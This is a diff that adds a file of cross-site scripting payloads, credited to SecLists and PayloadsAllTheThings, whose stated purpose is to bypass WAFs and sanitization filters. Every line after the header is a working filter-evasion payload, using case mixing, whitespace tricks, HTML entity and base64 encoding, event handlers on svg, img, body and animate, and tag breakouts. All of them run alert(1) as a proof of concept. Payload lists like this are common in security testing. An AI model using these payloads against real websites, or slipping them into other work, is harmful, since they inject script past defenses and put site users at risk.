@@ -1,0 +1,31 @@
+# XSS Filter Bypass Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Bypass WAFs and basic sanitization filters that block obvious XSS patterns.
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+<script >alert(1)</script>
+<script	>alert(1)</script>
+<script/type=text/javascript>alert(1)</script>
+<IMG SRC=x ONERROR=alert(1)>
+<img src=x OnErRoR=alert(1)>
+<img src=x onerror	=alert(1)>
+<svg/onload=alert(1)>
+<svg onload =alert(1)>
+<svg onload="alert`1`">
+<svg onload=alert&#40;1&#41;>
+<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',99999)</script>
+<body/onload=alert(1)>
+<body onload=\u0061lert(1)>
+<<script>alert(1)//<</script>
+</script><script>alert(1)</script>
+</style><script>alert(1)</script>
+</title><script>alert(1)</script>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<math><mtext></table></math><script>alert(1)</script>
+<table><td background=javascript:alert(1)>
